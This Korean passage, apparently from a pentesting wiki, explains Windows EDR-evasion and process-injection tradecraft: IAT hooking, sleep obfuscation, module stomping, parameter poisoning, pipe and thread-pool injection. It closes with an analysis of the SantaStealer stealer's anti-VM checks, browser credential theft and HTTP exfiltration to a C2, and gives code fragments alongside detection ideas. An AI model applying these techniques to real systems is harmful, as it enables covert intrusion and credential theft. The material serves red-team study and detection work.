- Aggressor script를 사용해 대상 API를 등록하면, 코드 변경 없이 Beacon과 BOF가 동일한 evasion 경로를 투명하게 이용할 수 있습니다.

탐지/DFIR 고려 사항
- IAT 무결성: non-image(heap/anon) 주소로 확인되는 항목 및 import pointer의 주기적 검증.
- Stack 이상 징후: 로드된 image에 속하지 않는 return address, non-image PIC로의 갑작스러운 전환, 일관되지 않은 RtlUserThreadStart ancestry.
- Loader telemetry: 프로세스 내부에서 발생하는 IAT 쓰기, import thunk를 수정하는 초기 DllMain 활동, 로드 시 생성되는 예상치 못한 RX 영역.
- Image-load evasion: LoadLibrary*를 hooking하는 경우, memory masking 이벤트와 연관된 의심스러운 automation/clr assembly 로드를 모니터링합니다.

관련 구성 요소 및 예시
- 로드 중 IAT patching을 수행하는 reflective loader(예: TitanLdr, AceLdr)
- Memory masking hook(예: simplehook) 및 stack-cutting PIC(stackcutting)
- PIC call-stack spoofing stub(예: Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### 상주 PICO를 통한 import-time IAT hook

reflective loader를 제어할 수 있다면, 사용자 지정 resolver로 loader의 `GetProcAddress` pointer를 교체해 `ProcessImports()` 실행 **중**에 import를 hooking할 수 있습니다:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- transient loader PIC가 해제된 뒤에도 유지되는 **resident PICO**(persistent PIC object)를 빌드합니다.
- loader의 import resolver를 덮어쓰는 `setup_hooks()` 함수를 export합니다(예: `funcs.GetProcAddress = _GetProcAddress`).
- `_GetProcAddress`에서는 ordinal import를 건너뛰고 `__resolve_hook(ror13hash(name))` 같은 hash 기반 hook lookup을 사용합니다. hook이 있으면 이를 반환하고, 없으면 실제 `GetProcAddress`에 처리를 위임합니다.
- Crystal Palace의 `addhook "MODULE$Func" "hook"` 항목을 사용해 link time에 hook 대상을 등록합니다. hook은 resident PICO 내부에 있으므로 계속 유효합니다.

이 방식은 로드 후 DLL의 code section을 patch하지 않고 **import-time IAT redirection**을 수행합니다.

### 대상이 PEB-walking을 사용하는 경우 hook 가능한 import 강제하기

import-time hook은 해당 함수가 실제로 대상의 IAT에 있는 경우에만 작동합니다. 모듈이 PEB-walk + hash로 API를 확인해 import entry가 없다면, 실제 import를 강제해 loader의 `ProcessImports()` 경로에서 처리되게 합니다.

- hash 기반 export 확인(예: `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`)을 `&WaitForSingleObject` 같은 직접 참조로 바꿉니다.
- compiler가 IAT entry를 생성하므로 reflective loader가 import를 확인할 때 interception할 수 있습니다.

### `Sleep()`을 patch하지 않는 Ekko 스타일 sleep/idle obfuscation

`Sleep`을 patch하는 대신 implant가 실제로 사용하는 **wait/IPC primitive**(`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`)를 hook합니다. 대기 시간이 긴 경우, idle 중 메모리의 image를 암호화하는 Ekko 스타일 obfuscation chain으로 호출을 감쌉니다:<sup>[[31]](#references)[[27]](#references)</sup>

- `CreateTimerQueueTimer`를 사용해 `NtContinue`를 crafted `CONTEXT` frame과 함께 호출하는 callback sequence를 예약합니다.
- 일반적인 chain(x64): image를 `PAGE_READWRITE`로 설정 → `advapi32!SystemFunction032`로 매핑된 전체 image를 RC4 암호화 → blocking wait 수행 → RC4 복호화 → PE section을 순회하며 **section별 권한 복원** → 완료 신호 전송.
- `RtlCaptureContext`로 template `CONTEXT`를 가져옵니다. 이를 여러 frame으로 복제하고 각 단계 호출을 위해 register(`Rip/Rcx/Rdx/R8/R9`)를 설정합니다.

운영 세부 사항: 긴 대기에서는 호출자가 image가 masking된 동안 계속 실행되도록 “success”(예: `WAIT_OBJECT_0`)를 반환합니다. 이 패턴은 idle 구간 동안 scanner로부터 모듈을 숨기며, 고전적인 “patched `Sleep()`” signature를 피합니다.

탐지 아이디어(telemetry 기반)
- `NtContinue`를 가리키는 `CreateTimerQueueTimer` callback이 연속적으로 발생하는 경우.
- 크기가 큰 연속 image 크기 버퍼에 `advapi32!SystemFunction032`를 사용하는 경우.
- 대규모 `VirtualProtect` 호출 후 custom section별 권한 복원이 이어지는 경우.

### Sleep-obfuscation gadget의 runtime CFG 등록

CFG가 활성화된 대상에서는 `jmp [rbx]` 또는 `jmp rdi` 같은 mid-function gadget으로 처음 indirect jump를 시도할 때, gadget이 모듈의 CFG metadata에 없어 보통 `STATUS_STACK_BUFFER_OVERRUN`으로 프로세스가 crash합니다. 강화된 프로세스에서 Ekko/Kraken 스타일 chain을 유지하려면:<sup>[[30]](#references)</sup>

- chain에서 사용하는 모든 indirect destination을 `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)`와 `CFG_CALL_TARGET_VALID` entry로 등록합니다.
- 로드된 image(`ntdll`, `kernel32`, `advapi32`) 안의 주소는 `MEMORY_RANGE_ENTRY`가 **image base**에서 시작해 **전체 image 크기**를 포함해야 합니다.
- 수동으로 매핑한/PIC/stomped 영역에는 **allocation base**와 allocation size를 사용합니다.
- dispatch gadget뿐 아니라 간접적으로 도달하는 export(`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscall)와 indirect target이 될 attacker-controlled executable section도 표시합니다.

이를 통해 ROP/JOP 스타일 sleep chain을 “CFG가 없는 프로세스에서만 작동”하는 방식에서 `/guard:cf`로 컴파일된 `explorer.exe`, browser, `svchost.exe` 및 기타 endpoint에서 재사용 가능한 primitive로 바꿀 수 있습니다.

### Sleeping thread를 위한 CET-safe stack spoofing

전체 `CONTEXT` 교체는 탐지하기 쉽고, spoof된 `Rip`가 hardware shadow stack과 일치해야 하므로 CET Shadow Stack 시스템에서 문제가 생길 수 있습니다. 더 안전한 sleep-masking 패턴은 다음과 같습니다:<sup>[[30]](#references)</sup>

- 동일 프로세스의 다른 thread를 선택하고 `NtQueryInformationThread`를 통해 해당 thread의 `NT_TIB` / TEB stack 경계(`StackBase`, `StackLimit`)를 읽습니다.
- 현재 thread의 실제 TEB/TIB를 백업합니다.
- `GetThreadContext`로 실제 sleep context를 캡처합니다.
- 실제 `Rip`만 spoof context로 복사하고 spoof된 `Rsp`/stack state는 그대로 둡니다.
- sleep 구간 동안 spoof thread의 `NT_TIB`를 현재 TEB에 복사해 stack walker가 정상적인 stack 범위 안에서 unwind하도록 합니다.
- 대기가 끝나면 원래 TIB와 thread context를 복원합니다.

이 방식은 CET와 일치하는 instruction pointer를 유지하면서, TEB stack metadata를 신뢰해 unwind를 검증하는 EDR stack walker를 오도합니다.

### APC 기반 대안: Kraken Mask

timer-queue dispatch가 너무 signatured된 경우, 동일한 sleep-encrypt-spoof-restore sequence를 queued APC를 사용해 suspended helper thread에서 실행할 수 있습니다:<sup>[[27]](#references)</sup>

- `NtTestAlert`를 entrypoint로 하는 helper thread를 생성합니다.
- `NtQueueApcThread`로 준비된 `CONTEXT` frame/APC를 queue하고 `NtAlertResumeThread`로 처리합니다.
- 기본 64 KB thread stack을 고갈시키지 않도록 chain state를 helper stack 대신 heap에 저장합니다.
- `NtSignalAndWaitForSingleObject`를 사용해 start event를 원자적으로 신호하고 대기 상태로 전환합니다.
- 복원 중 scanner가 반쯤 복원된 stack을 포착할 수 있는 race window를 줄이기 위해 TIB/context를 복원하기 전에 main thread를 suspend합니다(`NtSuspendThread` → restore → `NtResumeThread`).

이 방식은 동일한 RC4 masking 및 stack-spoofing 목표를 유지하면서 `CreateTimerQueueTimer` + `NtContinue` signature를 helper-thread/APC signature로 대체합니다.

추가 탐지 아이디어
- sleep, wait 또는 APC dispatch 직전에 `VmCfgCallTargetInformation`을 사용한 `NtSetInformationVirtualMemory` 호출.
- `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` 또는 `ConnectNamedPipe` 전후의 `GetThreadContext`/`SetThreadContext` 호출.
- `NtQueryInformationThread` 호출 후 현재 thread의 TEB/TIB stack 경계에 직접 쓰는 경우.
- 간접적으로 `SystemFunction032`, `VirtualProtect` 또는 section-permission restoration helper에 도달하는 `NtQueueApcThread`/`NtAlertResumeThread` chain.
- 서명된 모듈 내부의 dispatch pivot으로 `FF 23`(`jmp [rbx]`) 또는 `FF E7`(`jmp rdi`) 같은 짧은 gadget signature를 반복해서 사용하는 경우.


## Precision Module Stomping

Module stomping은 명백한 private executable memory를 할당하거나 희생용 DLL을 새로 로드하는 대신, 대상 프로세스에 이미 매핑된 DLL의 **`.text` section**에서 payload를 실행합니다. overwrite 대상은 프로세스가 여전히 필요로 하는 code path를 손상시키지 않고 payload를 수용할 수 있는 **로드된 disk-backed image**여야 합니다.<sup>[[1]](#references)[[2]](#references)</sup>

### 신뢰할 수 있는 대상 선택

`uxtheme.dll` 또는 `comctl32.dll` 같은 일반 모듈을 대상으로 하는 단순한 stomping은 취약합니다. DLL이 remote process에 로드되지 않았을 수 있고, code region이 너무 작으면 프로세스가 crash합니다. 더 신뢰할 수 있는 workflow는 다음과 같습니다.

1. 대상 프로세스의 모듈을 열거하고 이미 로드된 DLL만 포함하는 **이름 전용 include list**를 유지합니다.
2. 먼저 payload를 빌드하고 **정확한 byte 크기**를 기록합니다.
3. 디스크의 후보 DLL을 검색하고 PE section의 **`.text` `Misc_VirtualSize`**를 payload 크기와 비교합니다. 이는 매핑 시점의 executable section 크기를 반영하므로 file size보다 중요합니다.
4. **Export Address Table (EAT)**을 파싱하고 export된 함수의 RVA를 stomp 시작 offset으로 선택합니다.
5. **blast radius**를 계산합니다. payload가 선택한 함수의 경계를 넘으면 메모리에서 그 뒤에 배치된 인접 export를 덮어씁니다.

실제 환경에서 볼 수 있는 일반적인 recon/선택 helper:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

운영 참고 사항
- `LoadLibrary`/unexpected image loads로 인한 telemetry를 피하려면 원격 프로세스에 **이미 로드된** DLL을 우선 사용합니다.
- 대상 애플리케이션에서 실행되는 경우가 드문 export를 우선 사용합니다. 그렇지 않으면 스레드 생성 전후에 정상적인 코드 경로가 stomp된 바이트에 도달할 수 있습니다.
- 대규모 implant에서는 injector 소스에서 전체 버퍼가 올바르게 표현되도록 shellcode embedding을 문자열 리터럴에서 **byte-array/braced initializer**로 변경해야 하는 경우가 많습니다.

탐지 아이디어
- 일반적인 private RWX/RX 할당 대신 **image-backed executable pages**(`MEM_IMAGE`, `PAGE_EXECUTE*`)에 대한 원격 쓰기
- 메모리상의 export entry point 바이트가 디스크의 backing file과 더 이상 일치하지 않는 경우
- 최근 첫 바이트가 수정된 합법적인 DLL export 내부에서 실행을 시작하는 원격 스레드 또는 context pivot
- DLL `.text` 페이지에 대한 의심스러운 `VirtualProtect(Ex)` / `WriteProcessMemory` 호출 후 스레드 생성

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3)은 `VirtualAllocEx` + `WriteProcessMemory`라는 기존 원격 쓰기 경로를 피하는 **process-injection / EDR-evasion** 기법입니다. 이미 실행 중인 대상에 바이트를 복사하는 대신, Windows가 선택된 `CreateProcessW` 시작 매개변수를 자식 프로세스에 **복사**하고 이를 `PEB->ProcessParameters`(`RTL_USER_PROCESS_PARAMETERS`)에 저장한다는 점을 악용합니다.<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW`가 복사하는 변조 가능한 전달 매체

유용한 전달 매체는 다음과 같습니다.

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment`(`CREATE_UNICODE_ENVIRONMENT` 사용 시) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

전달 매체 사용 시 고려 사항:

- `lpCommandLine`은 `CreateProcessW`가 사용할 수 있도록 **쓰기 가능한 메모리**를 가리켜야 하며, null 종결자를 포함해 최대 **32,767개의 Unicode 문자**로 제한됩니다.
- `lpEnvironment`는 연속된 `NAME=VALUE\0` 문자열과 마지막의 추가 `\0`으로 종결되는 Unicode 환경 블록이어야 합니다.
- `lpReserved`는 공식적으로 예약된 항목이므로, `ShellInfo` 매핑은 안정적으로 문서화된 계약이 아니라 구현 세부 사항으로 취급해야 합니다.

이 방식은 일반적인 프로세스 생성을 **payload-transfer primitive**로 바꿉니다. 공격자는 제어하는 시작 데이터를 넣어 자식 프로세스를 생성하고, Windows가 프로세스 간 복사를 수행하도록 합니다.

### 원격 쓰기 API 없이 원격에서 위치 찾기

자식 프로세스가 생성된 뒤 읽기 전용 primitive를 사용해 복사된 버퍼를 찾습니다.

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` 가져오기
2. 원격 `PEB` 읽기
3. `PEB.ProcessParameters` 따라가기
4. `RTL_USER_PROCESS_PARAMETERS` 읽기
5. 선택한 포인터 사용:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

최소 흐름:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### 복사된 parameter buffer 실행

복사된 parameter 영역은 보통 실행 권한이 없는 `RW`입니다. 일반적인 P3 chain은 다음과 같습니다.

1. 프로세스를 정상적으로 생성합니다(일시 중단하지 않음).
2. `NtProtectVirtualMemory` / `VirtualProtectEx`를 사용해 선택한 parameter 페이지에 실행 권한을 부여합니다.
3. `PROCESS_INFORMATION`에서 이미 반환된 main thread handle을 재사용합니다.
4. `NtSetContextThread`(`CONTEXT_CONTROL`, `RIP` 덮어쓰기)를 사용해 실행 흐름을 리디렉션합니다.

일반적인 thread hijacking workflow와 달리, `SuspendThread` / `ResumeThread`는 **필요하지 않습니다**. 반환된 main thread handle에서 직접 context를 변경할 수 있습니다.

이 방식은 injection에 대해 흔히 모니터링되는 몇 가지 API를 사용하지 않습니다.

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- `SuspendThread` / `ResumeThread`도 자주 사용하지 않음

### Null byte 제한과 staged shellcode

세 가지 carrier는 모두 **문자열 또는 문자열과 유사한 데이터**이므로, `0x00`을 포함하는 raw payload는 전송 중 잘립니다. 실용적인 우회 방법은 런타임에 상수를 재구성한 뒤 임의의 두 번째 stage를 로드하는 **null-free 첫 번째 stage**를 사용하는 것입니다.

간단한 패턴으로 XOR 기반 상수 합성이 있습니다.

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

이렇게 하면 첫 번째 단계에서 전송된 매개변수에 null byte를 넣지 않고도 스택 문자열, API 인수, DLL 경로 또는 2단계 shellcode 로더를 구성할 수 있습니다.

### 첫 번째 단계에서 스택 기반 API 호출

첫 번째 단계에서 `LoadLibraryA` 같은 API를 호출해야 하는 경우 다음과 같이 할 수 있습니다.

- 대상 스택에 문자열/버퍼를 push합니다.
- **32-byte x64 shadow space**를 예약합니다.
- `RCX`, `RDX`, `R8`, `R9`를 상수 또는 `RSP` 기준 포인터로 설정합니다.
- 호출 전에 `RSP`가 **16-byte 정렬**을 유지하도록 합니다.

그런 다음 스택의 2단계를 `PAGE_READWRITE` 할당 영역에 복사하고, `VirtualProtect`로 `PAGE_EXECUTE_READ`로 변경한 뒤 해당 영역으로 점프할 수 있습니다. 이렇게 하면 직접적인 RWX 할당을 피할 수 있습니다.

### 탐지 아이디어

저자들이 언급한 유용한 탐지 기회는 다음과 같습니다.

- `VirtualProtectEx` / `NtProtectVirtualMemory`로 **프로세스 매개변수 페이지를 실행 가능하게 변경**
- 해당 보호 속성 변경 후 `SetThreadContext` / `NtSetContextThread` 호출
- `PEB`를 원격으로 읽은 다음 `RTL_USER_PROCESS_PARAMETERS` 읽기
- 프로세스 생성 시 비정상적으로 길거나 엔트로피가 높은 `lpCommandLine`, `lpEnvironment` 또는 `STARTUPINFO.lpReserved` 값

### 참고

- P3는 **프로세스 간 전송 기법**이지, 그 자체로 완전한 실행 프리미티브는 아닙니다. 복사된 매개변수에 실행 권한을 부여하고 실행 위치를 바꾸는 방법이 여전히 필요합니다.
- 저자들은 `RtlCreateProcessReflection` / Dirty Vanity도 고려했지만, 내부적으로 `NtWriteVirtualMemory` 및 `NtCreateThreadEx` 같은 의심스러운 프리미티브를 사용하기 때문에 제외했습니다.

## Console STDIN pipe injection

대화형 콘솔 자식 프로세스를 **payload 전송 프리미티브**로 사용할 수도 있습니다. 인젝터는 자식 프로세스의 표준 입력을 파이프로 리디렉션하고, 마커 다음에 shellcode를 전송합니다. 콘솔 프로그램이 데이터를 자체 사설 메모리로 읽어 들인 후, 인젝터는 해당 버퍼를 찾아 실행 가능하게 만들고 자식 스레드의 실행 위치를 그곳으로 바꿉니다. 이 방식은 `VirtualAllocEx`와 `WriteProcessMemory`를 피하지만, 일반적인 EDR 우회가 아닌 프로세스 인젝션입니다.<sup>[[41]](#references)</sup>

설명에는 "named-pipe"라고 되어 있지만, 참조 구현은 `CreatePipe`를 호출하며, 이는 **익명 파이프**를 생성합니다. Windows는 익명 파이프를 내부적으로 고유한 이름의 파이프 객체로 구현하지만, PoC는 `\\.\pipe\<name>` 경로를 지정하지도 않고 `CreateNamedPipe`를 호출하지도 않습니다. 기본 보안 설명자를 사용해 상속 가능한 핸들을 만들고, 읽기 핸들을 `STARTUPINFO.hStdInput`에 지정하며, `STARTF_USESTDHANDLES`를 설정한 뒤 핸들 상속을 활성화하여 새 자식 프로세스를 실행합니다. 따라서 이 PoC는 제공된 콘솔 실행 파일을 실행하며, 기존 프로세스에 파이프를 연결하지 않습니다.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### 참조 워크플로

구현에서는 다음 체인을 사용합니다.<sup>[[41]](#references)</sup>

1. 자식 프로세스의 `STDIN` 및 `STDOUT`용 익명 파이프 쌍을 생성합니다. 부모 측 핸들 두 개의 상속을 해제하고 프로세스 생성 후 부모의 자식 측 핸들 복사본을 닫습니다.
2. `CREATE_NEW_CONSOLE`을 사용해 `netsh.exe` 또는 `nslookup.exe` 같은 대화형 실행 파일을 시작합니다. 자식 프로세스는 리디렉션된 표준 핸들을 상속합니다.
3. 부모 측 `STDIN` 핸들을 통해 `WriteFile`로 전체 바이너리 `rawData` 배열을 전송합니다. 콘솔 프로그램은 바이트를 소비하고 자체 커밋된 사설 영역 중 하나에 복사본을 남깁니다.
4. `VirtualQueryEx`로 자식 프로세스의 주소 공간을 순회하고, `ReadProcessMemory`로 후보 `MEM_PRIVATE` 영역을 읽어 `rawData` 시작 부분의 마커를 검색합니다.
5. `VirtualProtectEx`로 찾은 버퍼를 `PAGE_EXECUTE_READWRITE`로 변경합니다.
6. 주 스레드를 식별해 일시 중단하고, `NtSetContextThread`로 `RIP`를 `found_address + 0x19`로 설정한 뒤 다시 실행합니다.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

제공된 구현은 x64 전용입니다. `CONTEXT.Rip`을 수정하며, 내장된 payload는 x64 shellcode입니다. `rawData`는 25바이트 marker로 시작하므로 실행 가능한 바이트는 16진수 오프셋 `0x19`에서 시작합니다. payload를 교체할 때는 이 레이아웃을 유지하거나 marker, 검색 벡터, 배열 크기 및 실행 오프셋을 함께 업데이트하세요. 소스 주석에는 `0x0A`, `0x0D`, `0x1A`도 bad character로 나열되어 있습니다. 이 workflow는 자식 프로세스의 token이나 권한을 변경하지 않습니다.<sup>[[41]](#references)</sup>

소규모 native helper 및 payload 컴파일 패턴은 [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md)를 참조하세요.

## shellcode 없이 thread-pool callback DLL injection (DLLParty)

DLLParty는 PoolParty 스타일의 thread-pool injection을 변형해, 기존 대상 worker가 삽입된 callback stub을 실행하는 대신 `LoadLibraryA`를 호출하도록 합니다. dispatch primitive는 대상 pool의 I/O completion port에 큐잉되는 `TP_DIRECT` completion입니다. 이 방법은 프로세스 권한을 우회하지 않습니다. PoC는 `OpenProcess(PROCESS_ALL_ACCESS)`를 호출하며, 대상 메모리에 대한 읽기/쓰기 권한과 worker-factory 및 completion-port handle을 복제할 수 있는 권한이 필요합니다.<sup>[[46]](#references)[[47]](#references)</sup>

Windows x64에서 worker는 stack 기반 `TP_CALLBACK_INSTANCE` 포인터를 첫 번째 callback 인수인 `RCX`로 전달합니다. `LoadLibraryA`는 이 포인터를 `LPCSTR`로 해석합니다. 테스트한 경로에서 `TppWorkerThread`는 `RSP+0x178`에 포인터를 구성하고, 해당 객체에 대한 첫 번째 일반 쓰기는 `RSP+0x1d0`에서 수행됩니다. 따라서 이 0x58바이트 prefix 안에 들어가는 null 종료 DLL 경로는 dispatch 전에 덮어쓰이지 않도록 instance의 시작 부분에 배치할 수 있습니다. 이는 특정 빌드에서 관찰된 내용이지, 문서화된 Windows ABI 보장은 아닙니다.<sup>[[46]](#references)[[47]](#references)</sup>

참조 workflow는 다음과 같습니다.<sup>[[46]](#references)[[47]](#references)</sup>

1. `NtQuerySystemInformation(SystemHandleInformation)`으로 대상의 handle을 열거하고, 객체 유형을 조회해 `TpWorkerFactory`를 식별합니다. worker-factory handle을 복제하고 `WorkerFactoryBasicInformation`을 조회합니다. `StartParameter`는 원격 `TP_POOL`을 가리킵니다. `TotalWorkerCount == 0`인 factory는 건너뜁니다.
2. `TP_POOL.CompletionPort`를 읽고 pool의 비공개 worker 목록을 순회합니다. 테스트한 Windows 10 19045 x64 빌드(`ntdll.dll 10.0.19041.4842`)에서는 목록의 head가 `pool+0x60`에 있고, 각 link는 `worker+0x10`에 있으므로 callback-instance slot은 `worker+0x38`, 즉 `link+0x28`입니다. PoC는 포인터 정렬, link 간 상호 참조, pool 소속 여부, 0이 아닌 thread ID, 중복 노드 및 안정된 목록 head를 확인합니다.
3. 큐에 넣은 completion은 어느 worker가 처리할지 알 수 없으므로, 복구한 **모든** worker slot에 DLL 경로를 씁니다. `Callback = LoadLibraryA`인 `TP_DIRECT`를 대상의 쓰기 가능한 메모리에 배치합니다. PoC는 `VirtualAllocEx` 대신 worker stack에서 `last_slot-0x500`을 사용합니다. 이 오프셋은 실험적으로 정해진 것이므로 활성 stack 데이터와 겹치지 않아야 합니다.
4. 대상 completion-port handle을 복제하고 `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`을 호출합니다. 원격 `TP_DIRECT` 주소는 completion key입니다. 기존 worker가 덮어쓴 callback-instance 포인터를 인수로 `LoadLibraryA`를 호출해, 대상이 이미 접근할 수 있는 DLL을 로드합니다.

PoC는 대상 PID(`DLLParty.exe <target_pid>`)를 인수로 받으며, `DLLParty.cpp`에 하드코딩된 DLL 경로를 사용합니다. 빌드 전에 대상이 접근할 수 있는 경로를 설정하고 x64 executable을 빌드하세요. 또한 자체 프로세스의 `LoadLibraryA` 주소를 원격 callback으로 사용하므로, 해당 주소가 대상에서도 유효하다고 가정합니다. 코드에는 경로 길이가 0x58바이트 prefix 안에 들어가는지 확인하는 검사와 worker 순회로 slot을 찾은 뒤 마지막 요소를 인덱싱하는지 확인하는 검사가 없습니다. 대상 빌드의 비공개 오프셋, stack 레이아웃 및 쓰기 가능한 공간을 다시 검증하세요. `CreateRemoteThreadEx`, shellcode 및 `VirtualAllocEx`를 사용하지 않더라도 프로세스 간 쓰기나 DLL 로드 telemetry가 사라지는 것은 아닙니다.<sup>[[46]](#references)[[47]](#references)</sup>

## 파일리스 회피 및 자격 증명 탈취를 위한 SantaStealer Tradecraft

SantaStealer(별칭 BluelineStealer)는 최신 info-stealer가 AV bypass, anti-analysis 및 credential access를 하나의 workflow에 결합하는 방식을 보여줍니다.<sup>[[24]](#references)</sup>

### 키보드 레이아웃 검사 및 sandbox 지연

- config flag(`anti_cis`)는 `GetKeyboardLayoutList`를 통해 설치된 키보드 레이아웃을 열거합니다. 키릴 문자 레이아웃이 발견되면 샘플은 빈 `CIS` marker를 남기고 종료해, 제외된 locale에서 실행되지 않도록 하면서도 hunting artifact를 남깁니다.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### 계층형 `check_antivm` 로직

- Variant A는 프로세스 목록을 순회하며 각 이름에 맞춤형 rolling checksum을 적용하고, 그 결과를 디버거/샌드박스용 내장 blocklist와 비교합니다. 컴퓨터 이름에도 같은 checksum을 적용하고 `C:\analysis` 같은 작업 디렉터리도 확인합니다.
- Variant B는 시스템 속성(프로세스 수 하한, 최근 부팅 시간)을 검사하고, `OpenServiceA("VBoxGuest")`를 호출해 VirtualBox additions를 탐지하며, sleep 전후의 타이밍을 확인해 single-stepping을 포착합니다. 하나라도 탐지되면 모듈이 실행되기 전에 중단합니다.

### Fileless helper + 이중 ChaCha20 reflective loading

- 기본 DLL/EXE에는 Chromium credential helper가 포함되어 있으며, 이 helper는 디스크에 기록되거나 메모리에 직접 매핑됩니다. Fileless 모드에서는 helper가 자체적으로 imports/relocations를 처리하므로 helper 관련 파일이 생성되지 않습니다.
- 이 helper는 두 번 ChaCha20으로 암호화된 2단계 DLL을 저장합니다(32바이트 키 2개 + 12바이트 nonce). 두 번의 복호화가 끝나면 blob을 reflective loading하고(`LoadLibrary` 사용 안 함), [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)에서 파생된 `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` exports를 호출합니다.<sup>[[25]](#references)</sup>
- ChromElevator 루틴은 direct-syscall reflective process hollowing을 사용해 실행 중인 Chromium browser에 주입하고, AppBound Encryption 키를 상속한 뒤 ABE hardening에도 불구하고 SQLite 데이터베이스에서 비밀번호/cookie/신용카드를 직접 복호화합니다.


### 모듈식 메모리 내 수집 및 청크 단위 HTTP 유출

- `create_memory_based_log`는 전역 `memory_generators` function-pointer 테이블을 순회하며 활성화된 모듈(Telegram, Discord, Steam, screenshots, documents, browser extensions 등)마다 스레드 하나를 생성합니다. 각 스레드는 결과를 공유 버퍼에 기록하고 약 45초의 join 대기 시간 후 파일 수를 보고합니다.
- 작업이 끝나면 정적으로 링크된 `miniz` 라이브러리로 모든 결과를 `%TEMP%\\Log.zip`으로 압축합니다. 그런 다음 `ThreadPayload1`은 15초간 sleep한 뒤 HTTP POST를 통해 아카이브를 10 MB 청크로 `http://<C2>:6767/upload`에 전송하며, 브라우저의 `multipart/form-data` boundary(`----WebKitFormBoundary***`)를 spoofing합니다. 각 청크에는 `User-Agent: upload`, `auth: <build_id>`, 선택적으로 `w: <campaign_tag>`가 추가되며, 마지막 청크에는 C2가 재조립 완료를 알 수 있도록 `complete: true`가 추가됩니다.

## References

- [1] [고급 회피 Tradecraft: 정밀 Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – 블로그](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stack: malware에 더는 공짜 패스는 없다](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – 문서](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – 예제](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – 예제](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – DarkCloud Stealer의 새로운 감염 체인과 ConfuserEx 기반 난독화](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – zero trust를 신뢰해야 할까? Zscaler posture 검사 우회](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – ToolShell 이전: Storm-2603의 과거 ransomware 작전 살펴보기](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Forwarded Exports 악용](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports 목록 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library 검색 순서](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – 프로세스 보안 및 액세스 권한](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU 참조 (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
